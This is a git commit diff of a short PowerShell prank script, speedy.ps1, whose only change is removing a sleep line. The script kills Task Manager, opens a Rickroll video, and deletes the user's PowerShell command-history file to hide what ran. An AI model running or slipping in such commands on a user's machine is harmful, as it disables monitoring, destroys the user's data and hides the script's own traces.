9080fe7610e2ffa8d127c448cca0bc56a8b25e14
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-07-30 11:56:13 +1000

    Update speedy.ps1
    boop

--- speedy.ps1
+++ speedy.ps1
@@ -2,5 +2,4 @@ taskkill /IM taskmgr.exe
 Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 cls
 Remove-Item -Path "$env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
-sleep 3
 exit
